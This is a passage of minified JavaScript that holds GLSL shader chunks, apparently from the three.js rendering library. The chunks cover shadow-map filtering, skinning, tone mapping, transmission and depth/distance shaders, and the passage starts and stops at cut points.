shadowCoord.y <= 1.0 );\n\t\tbool inFrustum = all( inFrustumVec );\n\t\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\t\tbool frustumTest = all( frustumTestVec );\n\t\tif ( frustumTest ) {\n\t\t#if defined( SHADOWMAP_TYPE_PCF )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tfloat dx2 = dx0 / 2.0;\n\t\t\tfloat dy2 = dy0 / 2.0;\n\t\t\tfloat dx3 = dx1 / 2.0;\n\t\t\tfloat dy3 = dy1 / 2.0;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 17.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx = texelSize.x;\n\t\t\tfloat dy = texelSize.y;\n\t\t\tvec2 uv = shadowCoord.xy;\n\t\t\tvec2 f = fract( uv * shadowMapSize + 0.5 );\n\t\t\tuv -= f * texelSize;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, uv, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( dx, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 0.0, dy ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + texelSize, shadowCoord.z ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( -dx, 0.0 ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 0.0 ), shadowCoord.z ),\n\t\t\t\t\t f.x ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( -dx, dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, dy ), shadowCoord.z ),\n\t\t\t\t\t f.x ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( 0.0, -dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 0.0, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t f.y ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( dx, -dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( dx, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t f.y ) +\n\t\t\t\tmix( mix( texture2DCompare( shadowMap, uv + vec2( -dx, -dy ), shadowCoord.z ), \n\t\t\t\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 2.0 * dx, -dy ), shadowCoord.z ),\n\t\t\t\t\t\t\tf.x ),\n\t\t\t\t\t mix( texture2DCompare( shadowMap, uv + vec2( -dx, 2.0 * dy ), shadowCoord.z ), \n\t\t\t\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t\t\tf.x ),\n\t\t\t\t\t f.y )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_VSM )\n\t\t\tshadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#else\n\t\t\tshadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#endif\n\t\t}\n\t\treturn shadow;\n\t}\n\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\n\t\tvec3 absV = abs( v );\n\t\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\n\t\tabsV *= scaleToCube;\n\t\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\n\t\tvec2 planar = v.xy;\n\t\tfloat almostATexel = 1.5 * texelSizeY;\n\t\tfloat almostOne = 1.0 - almostATexel;\n\t\tif ( absV.z >= almostOne ) {\n\t\t\tif ( v.z > 0.0 )\n\t\t\t\tplanar.x = 4.0 - v.x;\n\t\t} else if ( absV.x >= almostOne ) {\n\t\t\tfloat signX = sign( v.x );\n\t\t\tplanar.x = v.z * signX + 2.0 * signX;\n\t\t} else if ( absV.y >= almostOne ) {\n\t\t\tfloat signY = sign( v.y );\n\t\t\tplanar.x = v.x + 2.0 * signY + 2.0;\n\t\t\tplanar.y = v.z * signY - 2.0;\n\t\t}\n\t\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\n\t}\n\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\n\t\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\n\t\tvec3 lightToPosition = shadowCoord.xyz;\n\t\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );\t\tdp += shadowBias;\n\t\tvec3 bd3D = normalize( lightToPosition );\n\t\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )\n\t\t\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\n\t\t\treturn (\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#else\n\t\t\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\n\t\t#endif\n\t}\n#endif",shadowmap_pars_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tstruct DirectionalLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tstruct SpotLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tstruct PointLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t\tfloat shadowCameraNear;\n\t\t\tfloat shadowCameraFar;\n\t\t};\n\t\tuniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n#endif",shadowmap_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0 || NUM_SPOT_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0\n\t\tvec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\tvec4 shadowWorldPosition;\n\t#endif\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n#endif",shadowmask_pars_fragment:"float getShadowMask() {\n\tfloat shadow = 1.0;\n\t#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLightShadow directionalLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tdirectionalLight = directionalLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLightShadow spotLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tspotLight = spotLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLightShadow pointLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tpointLight = pointLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#endif\n\treturn shadow;\n}",skinbase_vertex:"#ifdef USE_SKINNING\n\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\n\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\n\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\n\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\n#endif",skinning_pars_vertex:"#ifdef USE_SKINNING\n\tuniform mat4 bindMatrix;\n\tuniform mat4 bindMatrixInverse;\n\t#ifdef BONE_TEXTURE\n\t\tuniform highp sampler2D boneTexture;\n\t\tuniform int boneTextureSize;\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tfloat j = i * 4.0;\n\t\t\tfloat x = mod( j, float( boneTextureSize ) );\n\t\t\tfloat y = floor( j / float( boneTextureSize ) );\n\t\t\tfloat dx = 1.0 / float( boneTextureSize );\n\t\t\tfloat dy = 1.0 / float( boneTextureSize );\n\t\t\ty = dy * ( y + 0.5 );\n\t\t\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n\t\t\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n\t\t\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n\t\t\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\t\t\tmat4 bone = mat4( v1, v2, v3, v4 );\n\t\t\treturn bone;\n\t\t}\n\t#else\n\t\tuniform mat4 boneMatrices[ MAX_BONES ];\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tmat4 bone = boneMatrices[ int(i) ];\n\t\t\treturn bone;\n\t\t}\n\t#endif\n#endif",skinning_vertex:"#ifdef USE_SKINNING\n\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\n\tvec4 skinned = vec4( 0.0 );\n\tskinned += boneMatX * skinVertex * skinWeight.x;\n\tskinned += boneMatY * skinVertex * skinWeight.y;\n\tskinned += boneMatZ * skinVertex * skinWeight.z;\n\tskinned += boneMatW * skinVertex * skinWeight.w;\n\ttransformed = ( bindMatrixInverse * skinned ).xyz;\n#endif",skinnormal_vertex:"#ifdef USE_SKINNING\n\tmat4 skinMatrix = mat4( 0.0 );\n\tskinMatrix += skinWeight.x * boneMatX;\n\tskinMatrix += skinWeight.y * boneMatY;\n\tskinMatrix += skinWeight.z * boneMatZ;\n\tskinMatrix += skinWeight.w * boneMatW;\n\tskinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;\n\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\n\t#ifdef USE_TANGENT\n\t\tobjectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#endif\n#endif",specularmap_fragment:"float specularStrength;\n#ifdef USE_SPECULARMAP\n\tvec4 texelSpecular = texture2D( specularMap, vUv );\n\tspecularStrength = texelSpecular.r;\n#else\n\tspecularStrength = 1.0;\n#endif",specularmap_pars_fragment:"#ifdef USE_SPECULARMAP\n\tuniform sampler2D specularMap;\n#endif",tonemapping_fragment:"#if defined( TONE_MAPPING )\n\tgl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\n#endif",tonemapping_pars_fragment:"#ifndef saturate\n#define saturate( a ) clamp( a, 0.0, 1.0 )\n#endif\nuniform float toneMappingExposure;\nvec3 LinearToneMapping( vec3 color ) {\n\treturn toneMappingExposure * color;\n}\nvec3 ReinhardToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( color / ( vec3( 1.0 ) + color ) );\n}\nvec3 OptimizedCineonToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\tcolor = max( vec3( 0.0 ), color - 0.004 );\n\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\n}\nvec3 RRTAndODTFit( vec3 v ) {\n\tvec3 a = v * ( v + 0.0245786 ) - 0.000090537;\n\tvec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;\n\treturn a / b;\n}\nvec3 ACESFilmicToneMapping( vec3 color ) {\n\tconst mat3 ACESInputMat = mat3(\n\t\tvec3( 0.59719, 0.07600, 0.02840 ),\t\tvec3( 0.35458, 0.90834, 0.13383 ),\n\t\tvec3( 0.04823, 0.01566, 0.83777 )\n\t);\n\tconst mat3 ACESOutputMat = mat3(\n\t\tvec3(\t1.60475, -0.10208, -0.00327 ),\t\tvec3( -0.53108,\t1.10813, -0.07276 ),\n\t\tvec3( -0.07367, -0.00605,\t1.07602 )\n\t);\n\tcolor *= toneMappingExposure / 0.6;\n\tcolor = ACESInputMat * color;\n\tcolor = RRTAndODTFit( color );\n\tcolor = ACESOutputMat * color;\n\treturn saturate( color );\n}\nvec3 CustomToneMapping( vec3 color ) { return color; }",transmission_fragment:"#ifdef USE_TRANSMISSION\n\tfloat transmissionAlpha = 1.0;\n\tfloat transmissionFactor = transmission;\n\tfloat thicknessFactor = thickness;\n\t#ifdef USE_TRANSMISSIONMAP\n\t\ttransmissionFactor *= texture2D( transmissionMap, vUv ).r;\n\t#endif\n\t#ifdef USE_THICKNESSMAP\n\t\tthicknessFactor *= texture2D( thicknessMap, vUv ).g;\n\t#endif\n\tvec3 pos = vWorldPosition;\n\tvec3 v = normalize( cameraPosition - pos );\n\tvec3 n = inverseTransformDirection( normal, viewMatrix );\n\tvec4 transmission = getIBLVolumeRefraction(\n\t\tn, v, roughnessFactor, material.diffuseColor, material.specularColor, material.specularF90,\n\t\tpos, modelMatrix, viewMatrix, projectionMatrix, ior, thicknessFactor,\n\t\tattenuationColor, attenuationDistance );\n\ttotalDiffuse = mix( totalDiffuse, transmission.rgb, transmissionFactor );\n\ttransmissionAlpha = mix( transmissionAlpha, transmission.a, transmissionFactor );\n#endif",transmission_pars_fragment:"#ifdef USE_TRANSMISSION\n\tuniform float transmission;\n\tuniform float thickness;\n\tuniform float attenuationDistance;\n\tuniform vec3 attenuationColor;\n\t#ifdef USE_TRANSMISSIONMAP\n\t\tuniform sampler2D transmissionMap;\n\t#endif\n\t#ifdef USE_THICKNESSMAP\n\t\tuniform sampler2D thicknessMap;\n\t#endif\n\tuniform vec2 transmissionSamplerSize;\n\tuniform sampler2D transmissionSamplerMap;\n\tuniform mat4 modelMatrix;\n\tuniform mat4 projectionMatrix;\n\tvarying vec3 vWorldPosition;\n\tvec3 getVolumeTransmissionRay( vec3 n, vec3 v, float thickness, float ior, mat4 modelMatrix ) {\n\t\tvec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );\n\t\tvec3 modelScale;\n\t\tmodelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );\n\t\tmodelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );\n\t\tmodelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );\n\t\treturn normalize( refractionVector ) * thickness * modelScale;\n\t}\n\tfloat applyIorToRoughness( float roughness, float ior ) {\n\t\treturn roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );\n\t}\n\tvec4 getTransmissionSample( vec2 fragCoord, float roughness, float ior ) {\n\t\tfloat framebufferLod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );\n\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\treturn texture2DLodEXT( transmissionSamplerMap, fragCoord.xy, framebufferLod );\n\t\t#else\n\t\t\treturn texture2D( transmissionSamplerMap, fragCoord.xy, framebufferLod );\n\t\t#endif\n\t}\n\tvec3 applyVolumeAttenuation( vec3 radiance, float transmissionDistance, vec3 attenuationColor, float attenuationDistance ) {\n\t\tif ( attenuationDistance == 0.0 ) {\n\t\t\treturn radiance;\n\t\t} else {\n\t\t\tvec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;\n\t\t\tvec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );\t\t\treturn transmittance * radiance;\n\t\t}\n\t}\n\tvec4 getIBLVolumeRefraction( vec3 n, vec3 v, float roughness, vec3 diffuseColor, vec3 specularColor, float specularF90,\n\t\tvec3 position, mat4 modelMatrix, mat4 viewMatrix, mat4 projMatrix, float ior, float thickness,\n\t\tvec3 attenuationColor, float attenuationDistance ) {\n\t\tvec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );\n\t\tvec3 refractedRayExit = position + transmissionRay;\n\t\tvec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );\n\t\tvec2 refractionCoords = ndcPos.xy / ndcPos.w;\n\t\trefractionCoords += 1.0;\n\t\trefractionCoords /= 2.0;\n\t\tvec4 transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );\n\t\tvec3 attenuatedColor = applyVolumeAttenuation( transmittedLight.rgb, length( transmissionRay ), attenuationColor, attenuationDistance );\n\t\tvec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );\n\t\treturn vec4( ( 1.0 - F ) * attenuatedColor * diffuseColor, transmittedLight.a );\n\t}\n#endif",uv_pars_fragment:"#if ( defined( USE_UV ) && ! defined( UVS_VERTEX_ONLY ) )\n\tvarying vec2 vUv;\n#endif",uv_pars_vertex:"#ifdef USE_UV\n\t#ifdef UVS_VERTEX_ONLY\n\t\tvec2 vUv;\n\t#else\n\t\tvarying vec2 vUv;\n\t#endif\n\tuniform mat3 uvTransform;\n#endif",uv_vertex:"#ifdef USE_UV\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n#endif",uv2_pars_fragment:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvarying vec2 vUv2;\n#endif",uv2_pars_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tattribute vec2 uv2;\n\tvarying vec2 vUv2;\n\tuniform mat3 uv2Transform;\n#endif",uv2_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvUv2 = ( uv2Transform * vec3( uv2, 1 ) ).xy;\n#endif",worldpos_vertex:"#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION )\n\tvec4 worldPosition = vec4( transformed, 1.0 );\n\t#ifdef USE_INSTANCING\n\t\tworldPosition = instanceMatrix * worldPosition;\n\t#endif\n\tworldPosition = modelMatrix * worldPosition;\n#endif",background_vert:"varying vec2 vUv;\nuniform mat3 uvTransform;\nvoid main() {\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\tgl_Position = vec4( position.xy, 1.0, 1.0 );\n}",background_frag:"uniform sampler2D t2D;\nvarying vec2 vUv;\nvoid main() {\n\tvec4 texColor = texture2D( t2D, vUv );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",cube_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\tgl_Position.z = gl_Position.w;\n}",cube_frag:"#include <envmap_common_pars_fragment>\nuniform float opacity;\nvarying vec3 vWorldDirection;\n#include <cube_uv_reflection_fragment>\nvoid main() {\n\tvec3 vReflect = vWorldDirection;\n\t#include <envmap_fragment>\n\tgl_FragColor = envColor;\n\tgl_FragColor.a *= opacity;\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",depth_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvarying vec2 vHighPrecisionZW;\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvHighPrecisionZW = gl_Position.zw;\n}",depth_frag:"#if DEPTH_PACKING == 3200\n\tuniform float opacity;\n#endif\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvarying vec2 vHighPrecisionZW;\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#if DEPTH_PACKING == 3200\n\t\tdiffuseColor.a = opacity;\n\t#endif\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <logdepthbuf_fragment>\n\tfloat fragCoordZ = 0.5 * vHighPrecisionZW[0] / vHighPrecisionZW[1] + 0.5;\n\t#if DEPTH_PACKING == 3200\n\t\tgl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );\n\t#elif DEPTH_PACKING == 3201\n\t\tgl_FragColor = packDepthToRGBA( fragCoordZ );\n\t#endif\n}",distanceRGBA_vert:"#define DISTANCE\nvarying vec3 vWorldPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\tvWorldPosition = worldPosition.xyz;\n}",distanceRGBA_frag:"#define DISTANCE\nuniform vec3 referencePosition;\nuniform float nearDistance;\nuniform float farDistance;\nvarying vec3 vWorldPosition;\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main () {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\tfloat dist = length( vWorldPosition - referencePosition );\n\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\n\tdist = saturate( dist );\n\tgl_FragColor = packDepthToRGBA( dist );\n}",equirect_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n}",equirect_frag:"uniform sampler2D tEquirect;\nvarying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvec3 direction = normalize( vWorldDirection );\n\tvec2 sampleUV = equirectUv( direction );\n\tvec4 texColor = texture2D( tEquirect, sampleUV );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",linedashed_vert:"uniform float scale;\nattribute float lineDistance;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\tvLineDistance = scale * lineDistance;\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include 